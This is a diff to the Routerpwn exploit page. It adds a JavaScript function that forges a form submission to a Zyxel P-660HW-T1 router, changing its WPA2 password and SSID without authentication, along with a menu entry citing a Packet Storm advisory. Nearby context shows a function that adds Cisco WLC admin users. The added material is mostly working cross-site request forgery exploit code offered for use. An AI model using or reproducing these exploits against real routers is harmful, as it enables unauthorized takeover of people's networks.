@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
 	<head>
-		<title>Routerpwn 1.20.229</title>
+		<title>Routerpwn 1.20.230</title>
 		<link rel="apple-touch-icon" HREF="favicon.png" />
 		<link rel="shortcut icon" HREF="favicon.ico" />
 		<meta name="apple-mobile-web-app-capable" content="yes" />
@@ -1585,6 +1585,26 @@ function ciscowlc_addadmin(ip)
 			<input type="hidden" name="buttonClicked" value="4"/>\
 			</form>';
 	post('https://' + ip + '/screens/aaa/mgmtuser_create.html', form);
+
+}
+
+// Zyxel P-660HW-T1 v3 Wireless Router - Change Wifi (WPA2/PSK) password & SSID
+function zyxel_660hwt1_v3_changessidpass(ip)
+{
+    ip = ip || "192.168.1.1";
+    pwd = prompt("New WLAN Password: ");
+    ssid = prompt("New SSID: ");
+    form = '<input type="hidden" name="EnableWLAN" value="on">\
+			<input type="hidden" name="Channel_ID" value="00000005">\
+			<input type="hidden" name="ESSID" value="' + ssid + ' ">\
+			<input type="hidden" name="Security_Sel" value="00000002">\
+			<input type="hidden" name="SecurityFlag" value="0">\
+			<input type="hidden" name="WLANCfgPSK" value="' + pwd + '">\
+			<input type="hidden" name="WLANCfgWPATimer" value="1800">\
+			<input type="hidden" name="QoS_Sel" value="00000000">\
+			<input type="hidden" name="sysSubmit" value="Uygula">';
+			
+	post('http://' + ip + '/Forms/WLAN_General_1', form);
 
 }
 
@@ -4469,7 +4489,14 @@ function belkinwpspin()
 
 
 <h2>ZyXEL</h2>
-<h3><a href="javascript:img('ZyXEL Prestige')">ZyXEL Prestige</a>, <a href="javascript:img('G-570S')">G-570S</a>, <a href="javascript:img('P-660H-D1')">P-660H-D1</a>, <a href="javascript:img('P-660H-D3')">P-660H-D3</a>, <a href="javascript:img('P-660HW-D1')">P-660HW-D1</a>, <a href="javascript:img('Zywall2')">Zywall2</a>, <a href="javascript:img('ZyWall USG')">ZyWall USG</a>, <a href="javascript:img('O2 Classic')">O2 Classic</a></h3>
+<h3><a href="javascript:img('ZyXEL Prestige')">ZyXEL Prestige</a>, <a href="javascript:img('G-570S')">G-570S</a>, <a href="javascript:img('P-660H-D1')">P-660H-D1</a>, <a href="javascript:img('P-660H-D3')">P-660H-D3</a>, <a href="javascript:img('P-660HW-D1')">P-660HW-D1</a>, <a href="javascript:img('Zywall2')">Zywall2</a>, <a href="javascript:img('ZyWall USG')">ZyWall USG</a>, <a href="javascript:img('O2 Classic')">O2 Classic</a>, <a href="javascript:img('P-660HW-T1')">P-660HW-T1</a></h3>
+
+<article>
+	<div>05/27/14</div>
+	<div><a href="http://packetstormsecurity.com/files/126812/Zyxel-P-660HW-T1-Cross-Site-Request-Forgery.html">[+]</a></div>
+	<div><a href="zyxel_660hwt1_v3_changessidpass()">Zyxel P-660HW-T1 v3 Wireless Router - Change Wifi (WPA2/PSK) password &amp; SSID</a></div>
+	<div><a href="zyxel_660hwt1_v3_changessidpass(ip)" onclick="return ip=prompt('IP:');">[SET IP]</a></div>
+</article>
 
 <article>
 	<div>05/04/11</div>
